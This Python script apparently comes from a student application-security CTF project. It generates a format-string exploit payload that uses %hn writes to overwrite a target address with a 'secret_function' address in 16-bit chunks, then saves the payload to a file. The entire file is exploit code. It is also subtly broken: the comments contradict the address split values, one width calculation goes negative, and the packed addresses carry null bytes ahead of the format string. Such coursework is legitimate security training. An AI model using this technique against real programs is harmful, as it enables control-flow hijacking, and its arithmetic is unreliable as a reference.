from struct import pack
import os

# Address where we want to overwrite with the split values (replace with actual target address)
target_address = 0x5ffd98

# Desired address (secret_function) split into parts
secret_function = 0x140001584
low_part = 0x1584      # First 16 bits
mid_part = 0x4000      # Second 16 bits
high_part = 0x0001     # Third 16 bits

# Construct addresses in little-endian order
payload = pack("<Q", target_address)      # For the low part (0x1584)
payload += pack("<Q", target_address + 2) # For the mid part (0x0001)
payload += pack("<Q", target_address + 4) # For the high part (0x0014)

# Assuming offset 10 is correct for the first target address on the stack
payload += b"%" + str(low_part).encode() + b"x" + b"%10$hn"
payload += b"%" + str(mid_part - low_part).encode() + b"x" + b"%11$hn"
payload += b"%" + str(high_part - mid_part).encode() + b"x" + b"%12$hn"

print(payload)

output_folder = r"D:\School\SC4013 - Application Security\CTF-Project\Backend"

# Ensure the output directory exists
os.makedirs(output_folder, exist_ok=True)

# Save the payload in the specified directory
output_path = os.path.join(output_folder, "payload2.txt")
with open(output_path, "wb") as f:
    f.write(payload)

print(f"Payload saved to: {output_path}")